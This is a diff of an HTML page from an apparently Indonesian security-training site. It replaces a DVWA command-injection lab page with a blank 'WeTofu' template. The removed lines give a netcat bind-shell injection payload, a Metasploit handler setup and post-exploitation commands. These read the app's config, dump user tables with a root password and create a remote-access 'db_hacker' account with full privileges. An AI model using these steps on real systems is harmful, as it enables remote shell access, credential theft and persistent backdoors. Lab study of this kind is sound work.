@@ -6,7 +6,7 @@
     <meta charset="UTF-8">
 
     <!-- ----------------------------------------------- DIGANTI JUDUL ----------------------------------------------- -->
-    <title>DVWA ComInj</title>
+    <title>WETOFU</title>
     <!-- ----------------------------------------------# DIGANTI JUDUL #---------------------------------------------- -->
 
 
@@ -141,7 +141,7 @@
                     <li class="chapter-item expanded "><a href="dvwa.html"><span><strong aria-hidden="true">2.19.</strong> DVWA </span></a></li>
                     <li>
                         <ol class="section">
-                            <li class="chapter-item expanded "><a href="dvwa-command-injection.html" style="color: rgb(255, 115, 138);"><span>2.19.1. Command Injection</span></a></li>
+                            <li class="chapter-item expanded "><a href="dvwa-command-injection.html"><span>2.19.1. Command Injection</span></a></li>
                             <li class="chapter-item expanded "><a href="dvwa-sql-injection.html"><span>2.19.2. SQL Injection</span></a></li>
                             <li class="chapter-item expanded "><a href="dvwa-upload-vuln.html"><span>2.19.3. Upload Vuln</span></a></li>
                             <li class="chapter-item expanded "><a href="dvwa-xss.html"><span>2.19.4. XSS</span></a></li>
@@ -150,7 +150,7 @@
                     </li>
                     <li class="chapter-item expanded "><span><strong aria-hidden="true">2.20.</strong> Dasar Pengamanan Server </span></li>
                     <li class="chapter-item expanded "><span><strong aria-hidden="true">2.21.</strong> Firewall </span></li>
-                    <li class="chapter-item expanded "><a href="proxy.html"><span><strong aria-hidden="true">2.22.</strong> Proxy </span></li>
+                    <li class="chapter-item expanded "><a href="proxy.html" style="color: rgb(255, 115, 138);"><span><strong aria-hidden="true">2.22.</strong> Proxy </span></li>
                     <li class="chapter-item expanded "><a href="vpn.html"><span><strong aria-hidden="true">2.23.</strong> VPN </span></a></li>
                     <li class="chapter-item expanded "><span><strong aria-hidden="true">2.24.</strong> Web Application Firewall </span></li>
                     <li class="chapter-item expanded "><span><strong aria-hidden="true">2.25.</strong> Pertahanan Host </span></li>
@@ -199,7 +199,7 @@
 
                 </div>
                 <!-- ----------------------------------------------- DIGANTI MENU TITLE ----------------------------------------------- -->
-                <h1 class="menu-title">DVWA Command Injection</h1>
+                <h1 class="menu-title">WeTofu</h1>
                 <!-- ----------------------------------------------# DIGANTI MENU TITLE #---------------------------------------------- -->
 
                 <div class="right-buttons">
@@ -240,61 +240,14 @@
             <div id="content" class="content">
                 <main>
                     <!-- ----------------------------------------------- DIGANTI MENU ----------------------------------------------- -->
-                    <h3><a class="header" href="#ci" id="ci" style="text-decoration: none;">Command Injection</a></h3>
-                    pake biasa :
-                    <ul>
-                        server :
-                        <pre><code>$ip_terserah;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe</code></pre>
-
-                        client :
-                        <pre><code>nc $ip_server 4444</code></pre>
+                    <h1><a class="header" href="#intro" id="intro">Intro</a></h1>
+                    <!-- <ul>
+                        <li><a class="header" href="#pengertian">Pengertian</a></li>
                     </ul>
-                    pake metasploit :
-                    <ul>
-                        server :
-                        <pre><code>$ip_terserah;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe</code></pre>
-
-                        client :
-                        <pre><code>msfconsole</code></pre>
-                        kasih IP server
-                        <pre><code>use multi/handler
-set PAYLOAD linux/x86/shell/bind_tcp
-show options
-set RHOST 192.168.43.207
-exploit</code></pre>
-                    </ul>
-
-                    bbrp instruksi bagus :
-                    <pre><code>whoami
-grep apache /etc/passwd
-grep apache /etc/group
-ps -eaf | grep http
-pwd
-ls -ld /var/www/html
-ls -ld /var/www/html/dvwa
-ls -l /var/www/html/dvwa
-ls -l /var/www/html/dvwa/config
-cat /var/www/html/dvwa/config/config.inc.php
-
-echo "show databases;" | mysql -uroot -pdvwaPASSWORD
-echo "use dvwa; show tables;" | mysql -uroot -pdvwaPASSWORD
-echo "use dvwa; desc users;" | mysql -uroot -pdvwaPASSWORD
-echo "select * from dvwa.users;" | mysql -uroot -pdvwaPASSWORD
-echo "insert into dvwa.users values ('6','John','Gray','jgray',MD5('abc123'),'NA');" | mysql -uroot
--pdvwaPASSWORD
-echo "select * from dvwa.users;" | mysql -uroot -pdvwaPASSWORD
-echo "show databases;" | mysql -uroot -pdvwaPASSWORD
-echo "use mysql; show tables;" | mysql -uroot -pdvwaPASSWORD
-echo "use mysql; GRANT ALL PRIVILEGES ON *.* TO 'db_hacker'@'%' IDENTIFIED BY 'abc123' WITH GRANT
-OPTION;" | mysql -uroot -pdvwaPASSWORD
-echo "select * from mysql.user;" | mysql -uroot -pdvwaPASSWORD
-
-mysql -u db_hacker -h 192.168.43.207 -p
-show databases;
-quit
-date
-echo "Your Name"</code></pre>
-<br><br>
+                    <br>
+                    <hr><br>
+                    <h2><a class="header" id="pengertian" style="text-decoration: none;">Pengertian</a></h2> -->
+                    <p> Kosong.</p>
 
                     <!-- ----------------------------------------------# DIGANTI MENU #---------------------------------------------- -->
                 </main>
@@ -304,12 +257,12 @@ echo "Your Name"</code></pre>
                     ----------------------------------------------- DIGANTI PREV NEXT -----------------------------------------------
 
                     sebelum
-                    <a rel="prev" href="dvwa.html" class="mobile-nav-chapters previous" title="Previous chapter"
+                    <a rel="prev" href="../index.html" class="mobile-nav-chapters previous" title="Previous chapter"
                         aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
                     sesudah
-                    <a rel="next" href="dvwasqli.html" class="mobile-nav-chapters next" title="Next chapter"
+                    <a rel="next" href="../index.html" class="mobile-nav-chapters next" title="Next chapter"
                         aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
@@ -323,12 +276,12 @@ echo "Your Name"</code></pre>
         <!-- <nav class="nav-wide-wrapper" aria-label="Page navigation">
             ----------------------------------------------- DIGANTI PREV NEXT 2 -----------------------------------------------
             sebelum
-            <a rel="prev" href="dvwa.html" class="nav-chapters previous" title="Previous chapter"
+            <a rel="prev" href="../index.html" class="nav-chapters previous" title="Previous chapter"
                 aria-label="Previous chapter" aria-keyshortcuts="Left">
                 <i class="fa fa-angle-left"></i>
             </a>
             sesudah
-            <a rel="next" href="dvwasqli.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter"
+            <a rel="next" href="../index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter"
                 aria-keyshortcuts="Right">
                 <i class="fa fa-angle-right"></i>
             </a>
